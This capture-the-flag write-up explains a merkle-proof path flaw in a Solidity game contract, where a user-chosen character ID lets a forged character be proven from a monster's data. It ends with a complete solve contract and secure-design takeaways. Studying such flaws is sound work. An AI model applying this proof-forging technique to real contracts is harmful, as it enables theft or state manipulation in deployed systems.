# World of Memecraft: Breaking Merkle Trees

In this CTF challenge, we explore a vulnerability in a World of Warcraft-inspired game's backup system. The challenge demonstrates how improper merkle tree implementation can lead to unauthorized state modifications.

## Challenge Overview

The challenge presents us with a simple game contract where:
- Players can create characters that start at level 1
- Characters can fight monsters to gain XP and level up
- The main objective is to kill Jenkins (monster ID 0), who is level 60
- Players can create backups of the game state and restore characters from these backups

The game includes standard RPG mechanics:
- Characters level up by gaining XP from killing monsters
- If a character dies, they can't fight anymore
- Dead monsters can't be fought again
- Actions are limited to one per block

# Initial Code Analysis

Let's examine the core game mechanics and data structures in detail.

## Game State

The game state is maintained in a `World` struct that contains:
```solidity
struct World {
    string servername;
    uint256 numPlayers;
    Character[] characters;
    Monster[] monsters;
    mapping(uint256 => address) characterOwner;
    mapping(address => uint256) lastActionBlock;
}
```

Characters and Monsters are defined as:
```solidity
struct Character {
    uint256 id;
    uint256 level;
    uint256 health;
    uint256 xp;
}

struct Monster {
    uint256 id;
    string name;
    uint256 level;
    uint256 health;
    uint256 kills;
    uint256 xpDrop;
    bool alive;
}
```

## Core Game Mechanics

### Character Creation
```solidity
function createCharacter() external oneActionPerBlock returns (uint id) {
    id = world.characters.length;
    world.characters.push(Character(
        id,
        1,  // Starting level
        100,  // Starting health
        0  // Starting XP
    ));
    world.characterOwner[id] = msg.sender;
    world.numPlayers++;
}
```
New characters always start at level 1 with 100 health and no XP.

### Combat System
```solidity
function fightMonster(uint characterId, uint monsterId) external {
    Monster storage monster = world.monsters[monsterId];
    require(monster.alive, "Stop! Stop! He's already dead!");

    Character storage character = world.characters[characterId];
    require(character.health > 0, "GAME_OVER");

    uint random = uint256(keccak256(abi.encodePacked(
        characterId, monsterId, gasleft(), 
        msg.sender, blockhash(block.number - 1)
    ))) % 2;

    if (character.level > monster.level || 
        (character.level == monster.level && random == 1)) {
        // Victory conditions
        character.xp += monster.xpDrop;
        monster.alive = false;
        if (character.xp >= XP_PER_LEVEL && character.level < 60) {
            character.level++;
            character.xp = 0;
        }
    } else { 
        // Defeat conditions
        character.health = 0;
        monster.kills++;
    }
}
```

Key combat mechanics:
1. Both character and monster must be alive to fight
2. Higher level always wins
3. Equal levels result in a 50/50 chance
4. Victory grants XP and kills the monster
5. Defeat kills the character and increments monster's kill count
6. Level ups occur at `XP_PER_LEVEL` (2,178,010) XP
7. Maximum level is capped at 60

### Starting Monsters

The game initializes with two monsters:
```solidity
constructor() {
    world.servername = "Draenor";
    _addMonster("Jenkins", 60, 10_000_000, 31337);  // ID 0
    _addMonster("Stonetusk Boar", 1, 1, BOAR_XP);   // ID 1
}
```

Jenkins (our target):
- Level 60
- 10,000,000 health
- Drops 31,337 XP

Stonetusk Boar:
- Level 1
- 1 health
- Drops 2 XP

## Leveling Analysis

To beat Jenkins legitimately, we need:
1. Level 60 character to guarantee victory
2. XP needed per level: 2,178,010
3. Total XP needed: 2,178,010 * 59 = 128,502,590
4. Boars needed: 128,502,590 / 2 = 64,251,295 boars

With the `oneActionPerBlock` modifier:
```solidity
modifier oneActionPerBlock {
    require(world.lastActionBlock[msg.sender] < block.number, "ONE_ACTION_PER_BLOCK");
    _;
    world.lastActionBlock[msg.sender] = block.number;
}
```

Each action (spawning boar, fighting) requires a new block. Assuming 1 block per second:
- Time needed: 64,251,295 * 2 seconds (spawn + fight)
- Total time: ~4 years

This is clearly impractical, pushing us to investigate the backup/restore system for vulnerabilities.

## The Backup System

The game implements a backup system using merkle trees. Let's examine its key components:

```solidity
function createBackup() external oneActionPerBlock {
    backups.push(world.merkleizeWorld());
}

function restoreCharacter(Character calldata character, bytes32[] calldata proof) 
    external 
    isCharacterOwner(character.id)
    oneActionPerBlock
{
    require(character.proofCharacter(backups[backups.length - 1], proof), "INVALID_CHARACTER_PROOF");
    Character storage _character = world.characters[character.id];
    _character.level = character.level;
    _character.health = character.health;
    _character.xp = character.xp;
}
```

The backup system merkleizes:
1. Server name
2. Number of players
3. Characters array
4. Monsters array

## Finding the Vulnerability

Several potential issues stand out in the merkle tree implementation:

1. No distinction between leaf and internal nodes
2. No proof length validation
3. Path calculation based on array indices

The most interesting aspect is how the merkle path is calculated:
```solidity
function proofCharacter(
    IWorldOfMemecraft.Character memory character,
    bytes32 backupRoot,
    bytes32[] memory proof
) internal pure returns (bool) {
    return _merkleProof(
        backupRoot,
        merkleizeCharacter(character),
        WORLD_CHARACTERS_INDEX << (CHARACTERS_TREE_HEIGHT - 1) | character.id,
        proof
    );
}
```

The critical vulnerability lies in how character IDs influence the merkle path. For IDs > 128, we can control bits in the path that should be inaccessible to players.

## The Exploit: Breaking Down the Merkle Tree Vulnerability

The game's backup system uses a multi-level merkle tree:
```solidity
uint public constant WORLD_NUM_ELEMENTS         = 4;
uint public constant WORLD_TREE_HEIGHT          = 3;
uint public constant WORLD_CHARACTERS_INDEX     = 2;
uint public constant WORLD_MONSTERS_INDEX       = 3;
uint public constant CHARACTERS_NUM_ELEMENTS    = 128;
uint public constant CHARACTERS_TREE_HEIGHT     = 8;
uint public constant MONSTERS_NUM_ELEMENTS      = 128;
uint public constant MONSTERS_TREE_HEIGHT       = 8;
uint public constant CHARACTER_NUM_ELEMENTS     = 4;
uint public constant CHARACTER_TREE_HEIGHT      = 3;
uint public constant MONSTER_NUM_ELEMENTS       = 7;
uint public constant MONSTER_TREE_HEIGHT        = 4;
```

The world state merkle tree has this structure:
```
                                            World Root
                    ┌─────────────────┬─────────────────┬─────────────────┐
                    │                 │                 │                 │
             Server Name       Num Players       Characters Root     Monsters Root
                                                        │                 │
                                                       ...               ...
                                                 ┌──────┴────┐       ┌────┴────┐
                                                 │           │       │         │
                                              Char 0        ...   Monster 0   ...
```

### The Path Calculation Vulnerability

The crucial vulnerability lies in how merkle paths are calculated. Let's look at the character proof path specifically:

```
WORLD_CHARACTERS_INDEX << (CHARACTERS_TREE_HEIGHT - 1) | character.id
```

The path is constructed by:
1. Shifting WORLD_CHARACTERS_INDEX (2) left by CHARACTERS_TREE_HEIGHT - 1 (7)
2. OR-ing with the character.id

For character ID 0, this gives us:
```
WORLD_CHARACTERS_INDEX << 7 = 2 << 7 = 256 = 100000000 (binary)
```

For Jenkins (Monster ID 0), the path is:
```
WORLD_MONSTERS_INDEX << 7  = 3 << 7 = 384 = 110000000 (binary)
```

### Data Structure Alignment

We also need to consider how the character and monster data structures would overlap. Here's how the Monster and Character structures align in memory:

```solidity
struct Monster {                     struct Character {
    uint256 id;        // 0             uint256 id;        // 0
    string name;       // 1             uint256 level;     // 1
    uint256 level;     // 2             uint256 health;    // 2
    uint256 health;    // 3             uint256 xp;        // 3
    uint256 kills;     // 4   ─┐
    uint256 xpDrop;    // 5    ├─ These map to Character fields
    bool alive;        // 6   ─┘
                       // 7 (empty, hashed as previous field)
}
```

When merkleized, the right half of Monster's data can be interpreted as a Character:
- Monster.kills (513) → Character.id
- Monster.xpDrop (31337) → Character.level
- Monster.alive (true/false) → Character.health
- Monster.alive (true/false) → Character.xp (since empty right nodes are ignored in the merkleization)


### Calculating the Character ID

For the merkle proofs, we need to consider three important paths:
1. Path to Character 0: `100000000` (binary)
   - This comes from `WORLD_CHARACTERS_INDEX (2) << 7 = 256`
2. Path to Monster 0 (Jenkins): `110000000` (binary)
   - This comes from `WORLD_MONSTERS_INDEX (3) << 7 = 384`
3. Path to the right half of Monster 0's data: `1100000001` (binary)
   - This is Monster 0's path plus an extra bit for accessing the right half

To exploit the vulnerability, we need a character ID that, when used in the character proof calculation, will give us the path to the right half of Monster 0's data. Working backwards:

```
Character path = WORLD_CHARACTERS_INDEX << 7 | character.id
1100000001 (desired path)
0100000000 (WORLD_CHARACTERS_INDEX << 7)
---------------
1000000001 (required character.id in binary)
```

Converting `1000000001` from binary to decimal gives us 513. Therefore:
1. We need to die exactly 513 times to set Jenkins' kill counter
2. We need to create exactly 513 characters to claim ID 513
3. We use 513 as our fake character's ID

This gives us a path that allows us to reach into the monster tree and specifically access the right half of Jenkins' data, where xpDrop (31337) will become our character's level.

### Building the Exploit

The attack requires several steps:

1. Set up Jenkins' kill count:
```solidity
// Create character and backup
world.createCharacter();
vm.roll(block.number + 1);
world.createBackup();

// Die to Jenkins 513 times
for (uint i = 0; i < 513; i++) {
    vm.roll(block.number + 1);
    world.restoreCharacter(character, proof);
    vm.roll(block.number + 1);
    world.fightMonster(0, 0);
}
```

2. Create our fake character structure:
```solidity
IWorldOfMemecraft.Character memory fakeCharacter;
fakeCharacter.id = 513;      // Chosen to match Jenkins' kills
fakeCharacter.level = 31337; // Will come from Jenkins' xpDrop
fakeCharacter.health = 1;    // From Jenkins' alive boolean
fakeCharacter.xp = 1;        // From Jenkins' alive boolean
```

3. Build the merkle proof:
```solidity
bytes32[] memory fakeProof = new bytes32[](10);

// First part of proof uses Jenkins' upper fields
fakeProof[0] = keccak256(
    abi.encodePacked(
        keccak256(
            abi.encodePacked(
                keccak256(abi.encode(monster0.id)),
                keccak256(abi.encode(monster0.name))
            )
        ),
        keccak256(
            abi.encodePacked(
                keccak256(abi.encode(monster0.level)),
                keccak256(abi.encode(monster0.health))
            )
        )
    )
);

// Verify our construction
require(
    keccak256(
        abi.encodePacked(
            fakeProof[0], fakeCharacterMerkle
        )
    ) == monster0.merkleizeMonster()
);

// Build rest of the proof path
fakeProof[1] = monster1.merkleizeMonster();
fakeProof[2] = keccak256(abi.encodePacked(monster0.merkleizeMonster(), fakeProof[1]));
// ... continue building proof ...
```

4. Execute the restore and kill Jenkins:
```solidity
world.restoreCharacter(fakeCharacter, fakeProof);
vm.roll(block.number + 1);
world.fightMonster(513, 0);
```

### Why It Works

The exploit succeeds because:
1. Character ID 513 gives us path 1000000001 in binary
2. This path lets us reach into the monster tree portion
3. The right half of Jenkins' merkle node aligns with Character fields
4. The proof validation doesn't check tree boundaries
5. The restored character inherits Jenkins' xpDrop as its level

This gives us a level 31337 character, well above Jenkins' level 60, ensuring victory.

## Complete Solution

```solidity
contract Solve is CTFSolver {
    using BackupLogic for IWorldOfMemecraft.Character;
    using BackupLogic for IWorldOfMemecraft.Monster;

    function solve(address challengeAddress, address player) internal override {
        Challenge challenge = Challenge(challengeAddress);
        WorldOfMemecraft world = challenge.WORLD_OF_MEMECRAFT();
        
        // Create initial character and backup
        world.createCharacter();
        vm.roll(block.number + 1);
        world.createBackup();
        
        // Get initial merkle proof components
        IWorldOfMemecraft.Character memory character = world.getCharacter(0);
        bytes32 characterMerkle = character.merkleizeCharacter();
        
        // Construct proof for character restoration
        bytes32[] memory proof = new bytes32[](9);
        proof[0] = characterMerkle;
        for(uint i = 1; i < 7; i++) {
            proof[i] = keccak256(abi.encodePacked(proof[i-1], proof[i-1]));
        }
        bytes32 charactersMerkle = keccak256(abi.encodePacked(proof[6], proof[6]));
        proof[7] = bytes32(uint256(32669197447154008537373447036772906393060124346300159938840376223897295441772));
        proof[8] = keccak256(abi.encodePacked(
            bytes32(uint256(45217210725143634887611559816868982514030355070947982912101667450297164649858)),
            bytes32(uint256(80084422859880547211683076133703299733277748156566366325829078699459944778998))
        ));

        // Die to Jenkins 513 times
        for (uint i = 0; i < 513; i++) {
            vm.roll(block.number + 1);
            world.restoreCharacter(character, proof);
            vm.roll(block.number + 1);
            world.fightMonster(0, 0);
        }
        
        // Verify Jenkins' kills and create new backup
        require(world.getMonster(0).kills == 513);
        vm.roll(block.number + 1);
        world.restoreCharacter(character, proof);
        vm.roll(block.number + 1);
        world.createBackup();
        
        // Create 513 characters to claim ID 513
        for (uint i = 0; i < 513; i++) {
            vm.roll(block.number + 1);
            world.createCharacter();
        }

        // Create fake character from Jenkins' data
        IWorldOfMemecraft.Character memory fakeCharacter;
        fakeCharacter.id = 513;
        fakeCharacter.level = 31337;
        fakeCharacter.health = 1;
        fakeCharacter.xp = 1;

        // Get monster data for proof construction
        IWorldOfMemecraft.Monster memory monster0 = world.getMonster(0);
        IWorldOfMemecraft.Monster memory monster1 = world.getMonster(1);

        // Construct proof for fake character
        bytes32 fakeCharacterMerkle = fakeCharacter.merkleizeCharacter();
        bytes32[] memory fakeProof = new bytes32[](10);
        
        // Build the proof using monster merkle data
        fakeProof[0] = keccak256(
            abi.encodePacked(
                keccak256(
                    abi.encodePacked(
                        keccak256(abi.encode(monster0.id)),
                        keccak256(abi.encode(monster0.name))
                    )
                ),
                keccak256(
                    abi.encodePacked(
                        keccak256(abi.encode(monster0.level)),
                        keccak256(abi.encode(monster0.health))
                    )
                )
            )
        );
        
        // Verify our construction matches monster's merkle root
        require(
            keccak256(
                abi.encodePacked(
                    fakeProof[0], fakeCharacterMerkle
                )
            ) == monster0.merkleizeMonster()
        );
        
        // Complete the proof
        fakeProof[1] = monster1.merkleizeMonster();
        fakeProof[2] = keccak256(abi.encodePacked(monster0.merkleizeMonster(), fakeProof[1]));
        for(uint i = 3; i < 8; i++) {
            fakeProof[i] = keccak256(abi.encodePacked(fakeProof[i-1], fakeProof[i-1]));
        }
        fakeProof[8] = charactersMerkle;
        fakeProof[9] = proof[8];

        // Restore fake character and kill Jenkins
        vm.roll(block.number + 1);
        world.restoreCharacter(fakeCharacter, fakeProof);
        vm.roll(block.number + 1);
        world.fightMonster(513, 0);
        require(challenge.isSolved());
    }
}
```

## Key Takeaways

1. Merkle tree implementations need careful validation of node types and proof paths
2. Array indices used in merkle paths should be strictly bounded
3. Data structures that share similar layouts can lead to unexpected type confusion
4. When dealing with merkle proofs, always verify that paths can't be manipulated by user input

The vulnerability demonstrates how even a seemingly secure backup system can be compromised when merkle tree implementation details aren't properly considered.